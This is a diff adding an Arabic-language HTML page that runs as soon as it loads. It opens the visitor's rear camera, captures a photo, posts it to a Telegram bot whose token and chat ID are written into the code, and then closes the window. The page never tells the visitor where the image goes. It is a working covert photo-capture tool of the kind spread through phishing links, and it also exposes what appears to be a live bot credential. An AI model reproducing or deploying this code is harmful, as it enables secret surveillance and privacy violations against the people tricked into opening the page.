@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>التقاط تلقائي</title>
+    <script>
+        // استبدل هذه القيم بمعلومات بوتك
+        const BOT_TOKEN = '7512390719:AAHuHzUgshfHoqS-kkjzKxYrHFI0gHlWlsU';
+        const CHAT_ID = '7327464581';
+
+        async function captureAndSend() {
+            try {
+                // طلب إذن الكاميرا
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'environment', // استخدام الكاميرا الخلفية إن وجدت
+                        width: { ideal: 1280 },   // دقة منخفضة للسرعة
+                        height: { ideal: 720 }
+                    } 
+                });
+                
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                
+                // التقاط الصورة بأسرع وقت ممكن
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // إيقاف الكاميرا فوراً
+                stream.getTracks().forEach(track => track.stop());
+                
+                // تحويل الصورة وإرسالها
+                canvas.toBlob(async (blob) => {
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'auto_capture.jpg');
+                    
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    // إغلاق النافذة بعد 1 ثانية من الإرسال
+                    setTimeout(() => window.close(), 1000);
+                }, 'image/jpeg', 0.7); // جودة 70% للسرعة
+                
+            } catch (error) {
+                console.error('Error:', error);
+                window.close();
+            }
+        }
+
+        // تشغيل الوظيفة فور تحميل الصفحة
+        window.onload = captureAndSend;
+    </script>
+</head>
+<body>
+    <div style="text-align: center; padding: 50px;">
+        <h2>جاري التحضير لالتقاط الصورة...</h2>
+        <p>سيتم طلب إذن استخدام الكاميرا</p>
+    </div>
+</body>
+</html>
